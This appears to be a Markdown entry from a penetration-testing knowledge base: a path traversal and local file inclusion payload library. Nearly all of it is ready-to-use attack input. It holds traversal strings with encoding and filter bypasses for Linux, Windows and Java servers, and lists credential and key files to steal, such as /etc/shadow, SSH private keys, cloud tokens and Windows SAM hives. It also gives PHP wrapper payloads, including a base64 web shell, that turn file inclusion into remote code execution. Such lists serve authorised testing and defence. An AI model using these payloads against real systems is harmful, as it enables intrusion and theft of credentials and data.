---
id: "path-traversal-lfi-payloads"
title: "Path Traversal & LFI Payload Library"
type: "payload"
category: "web-application"
subcategory: "lfi"
tags: ["path-traversal", "lfi", "directory-traversal", "null-byte", "encoding-bypass", "interesting-files", "php-wrappers", "log-poisoning", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["path-traversal", "command-injection-payloads", "file-upload"]
updated: "2026-04-14"
---

## Overview

Comprehensive path traversal and LFI payload library organized by technique: basic traversal, encoding bypasses, null bytes, OS-specific interesting files, and LFI-to-RCE escalation. 800+ evasion variants exist. Always start with basic payloads, then apply encoding bypasses.

## Basic Traversal Sequences

### Linux
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
```

### Windows
```
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\..\..\windows\win.ini
```

### Mixed separators
```
..\/..\/..\/etc/passwd
../..\..\etc/passwd
..\../..\/etc\passwd
..%5c..%5c..%5cetc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

## Encoding Bypass Payloads

### URL encoding (single)
```
%2e%2e%2fetc%2fpasswd
%2e%2e/etc/passwd
..%2fetc%2fpasswd
..%2fetc/passwd
%2e%2e%5cetc%5cpasswd
..%5cetc%5cpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Double URL encoding
```
%252e%252e%252fetc%252fpasswd
%252e%252e/%252e%252e/%252e%252e/etc/passwd
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd
```

### UTF-8 / overlong encoding
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c0%ae%c0%ae%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%f0%80%80%af..%f0%80%80%afetc/passwd
```

### 16-bit Unicode encoding
```
..%u2215..%u2215..%u2215etc/passwd
..%u2216..%u2216..%u2216etc%u2216passwd
%uff0e%uff0e%u2215etc%u2215passwd
```

### HTML entity encoding
```
..&#47;..&#47;..&#47;etc&#47;passwd
..&#x2f;..&#x2f;..&#x2f;etc&#x2f;passwd
&#46;&#46;&#47;&#46;&#46;&#47;etc&#47;passwd
```

## Filter Bypass Techniques

### Stripped ../ (double traversal)
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
....\\....\\....\\etc\\passwd
..../..../..../etc/passwd
```

### Null byte injection (PHP < 5.3.4, older frameworks)
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.pdf
../../../etc/passwd%2500
../../../etc/passwd\0
../../../etc/passwd\0.txt
```

### Path truncation (Windows)
```
# Windows MAX_PATH = 260 characters
../../../etc/passwd...........[fill to 260]
../../../etc/passwd./././././[fill to 260]
../../../etc/passwd%00%00%00%00%00[fill]
```

### Nginx/Tomcat-specific bypass
```
# Nginx path normalization bypass
..;/..;/..;/etc/passwd
..;/../../../etc/passwd

# Tomcat path parameter bypass
../..;/..;/etc/passwd
/..;/..;/..;/etc/passwd
```

### Absolute path bypass
```
/etc/passwd
/etc/shadow
C:\windows\win.ini
C:/windows/win.ini
```

### Wrapper/protocol abuse
```
file:///etc/passwd
file://localhost/etc/passwd
file:///C:/windows/win.ini
\\localhost\c$\windows\win.ini
```

### Java-specific bypass
```
# Spring / Java path traversal
/../../../etc/passwd
/..%252f..%252f..%252fetc/passwd
/..\..\..\etc\passwd
/..%00/..%00/..%00/etc/passwd
```

## Interesting Files -- Linux

### System files
```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/issue
/etc/motd
/etc/os-release
/etc/crontab
/etc/fstab
/etc/exports
/etc/sudoers
/etc/ssh/sshd_config
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_ecdsa_key
/etc/ld.so.conf
/etc/network/interfaces
/etc/sysctl.conf
```

### Process / runtime
```
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/maps
/proc/self/mounts
/proc/self/net/arp
/proc/self/net/tcp
/proc/self/net/udp
/proc/version
/proc/cpuinfo
/proc/sched_debug
/proc/1/cmdline
/proc/1/environ
```

### User files
```
/home/*/.ssh/id_rsa
/home/*/.ssh/id_ed25519
/home/*/.ssh/authorized_keys
/home/*/.ssh/known_hosts
/home/*/.bash_history
/home/*/.bashrc
/home/*/.profile
/home/*/.gitconfig
/home/*/.wget-hsts
/home/*/.netrc
/root/.ssh/id_rsa
/root/.bash_history
/root/.mysql_history
```

### Web server / application
```
/var/www/html/.env
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/configuration.php
/var/www/html/.htpasswd
/var/www/html/.htaccess
/var/www/html/web.config
/opt/*/config/*
/opt/*/.env
```

### Log files (for log poisoning)
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/syslog
/var/log/auth.log
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/cups/access_log
```

### Database config
```
/etc/mysql/my.cnf
/etc/my.cnf
/etc/postgresql/*/main/pg_hba.conf
/var/lib/mysql/mysql/user.MYD
/etc/redis/redis.conf
/etc/mongod.conf
```

### Docker / Container
```
/.dockerenv
/proc/1/cgroup
/proc/self/cgroup
/run/secrets/*
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Cloud credentials
```
/home/*/.aws/credentials
/home/*/.aws/config
/root/.aws/credentials
/home/*/.azure/accessTokens.json
/home/*/.config/gcloud/credentials.db
/home/*/.config/gcloud/access_tokens.db
/home/*/.config/gcloud/application_default_credentials.json
```

## Interesting Files -- Windows

### System
```
C:\windows\win.ini
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\config\security
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\license.rtf
C:\windows\debug\netsetup.log
C:\windows\repair\sam
C:\windows\repair\system
C:\windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles\
C:\windows\panther\unattended.xml
C:\windows\panther\unattend.xml
C:\windows\system32\sysprep\unattend.xml
```

### Application
```
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asa
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\tomcat\conf\server.xml
C:\xampp\tomcat\conf\tomcat-users.xml
C:\Program Files\Apache Software Foundation\Tomcat\conf\tomcat-users.xml
C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml
C:\Users\*\.ssh\id_rsa
C:\Users\*\Desktop\*.kdbx
C:\Users\*\Documents\*.kdbx
```

### IIS-specific
```
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\inetsrv\config\schema\ASPNET_schema.xml
C:\windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
```

## Interesting Files -- macOS

```
/etc/master.passwd
/Users/*/.ssh/id_rsa
/Users/*/.bash_history
/Users/*/.zsh_history
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
/Users/*/Library/Keychains/login.keychain-db
```

## Interesting Files -- Application Framework Specific

### Node.js
```
package.json
.env
.env.local
.env.production
config/default.json
config/production.json
node_modules/.package-lock.json
```

### Python/Django/Flask
```
settings.py
config.py
.env
requirements.txt
Pipfile
wsgi.py
manage.py
```

### Ruby/Rails
```
config/database.yml
config/secrets.yml
config/master.key
config/credentials.yml.enc
.env
Gemfile
```

### Java/Spring
```
application.properties
application.yml
application-prod.yml
WEB-INF/web.xml
META-INF/MANIFEST.MF
pom.xml
build.gradle
```

### PHP
```
.env
config.php
wp-config.php
configuration.php
settings.php
LocalSettings.php
includes/configure.php
```

### .git directory (source code disclosure)
```
.git/config
.git/HEAD
.git/refs/heads/main
.git/refs/heads/master
.git/logs/HEAD
.git/index
.git/COMMIT_EDITMSG
.git/description
.git/packed-refs
```

## PHP Wrappers for LFI

```
# Read source code as base64
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php

# Read with rot13
php://filter/read=string.rot13/resource=config.php

# Read with multiple filters
php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php

# RCE via php://input
POST /page.php?file=php://input
Body: <?php system('id'); ?>

# RCE via data://
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
data://text/plain,<?php system('id'); ?>

# RCE via expect://
expect://id
expect://cat /etc/passwd

# RCE via zip://
zip:///tmp/uploads/evil.zip%23shell.php

# RCE via phar://
phar:///tmp/uploads/evil.phar/shell.php

# PHP filter chain RCE (no file upload needed)
# Generate with php_filter_chain_generator.py
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

## Tools

- **dotdotpwn** -- Automated directory traversal fuzzer
- **ffuf** -- Fuzz file parameters with LFI wordlists
- **psychoPATH** -- Advanced path traversal payload generator
- **Burp Suite** -- Manual path manipulation and intruder
- **SecLists** -- LFI wordlists (Fuzzing/LFI/)
- **php_filter_chain_generator** -- PHP filter chain RCE payloads
